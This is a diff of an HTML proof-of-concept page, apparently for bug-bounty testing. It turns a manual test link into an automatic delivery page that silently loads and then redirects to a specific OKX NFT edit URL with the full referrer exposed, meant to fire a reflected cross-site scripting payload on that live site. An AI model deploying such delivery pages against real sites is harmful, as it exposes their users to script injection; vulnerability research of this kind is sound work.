@@ -2,14 +2,20 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>XSS Redirect Test</title>
+    <title>Redirect with Malicious Referer</title>
+    <script>
+        // Create a function to perform the redirect
+        function redirect() {
+            // This will trigger an XSS payload on the target site if it's vulnerable
+            window.location.href = "https://www.okx.com/web3/marketplace/nft/create/collection/edit/10481401";
+        }
+
+        // Simulate the request with the Referer header using an image
+        document.write('<img src="https://www.okx.com/web3/marketplace/nft/create/collection/edit/10481401" onload="redirect()" style="display:none;" referrerpolicy="unsafe-url">');
+    </script>
 </head>
-<body>
-    <h1>Testing OKX XSS Vulnerability via Redirect</h1>
-    <p>Click the link below to initiate the test:</p>
-    <!-- Link directly to payload.html -->
-    <a href="https://www.okx.com/web3/marketplace/nft/create/collection/edit/10481401">
-        Go to Payload
-    </a>
+<body onload="redirect()">
+    <h1>Redirecting...</h1>
+    <p>If the target is vulnerable, an alert should appear on the OKX page.</p>
 </body>
 </html>
